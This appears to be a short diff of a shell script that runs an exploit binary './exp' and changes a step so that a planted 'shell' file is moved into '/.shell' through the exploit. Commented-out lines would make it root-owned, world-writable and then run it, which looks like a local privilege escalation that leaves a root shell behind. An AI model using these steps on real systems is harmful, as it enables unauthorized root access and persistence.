@@ -1,6 +1,6 @@
 chmod +x ./exp
 ./exp
-mv ./shell /.shell
+./exp "mv ./shell /.shell"
 #chown root /.shell
 #chmod 777 /.shell
 #/.shell
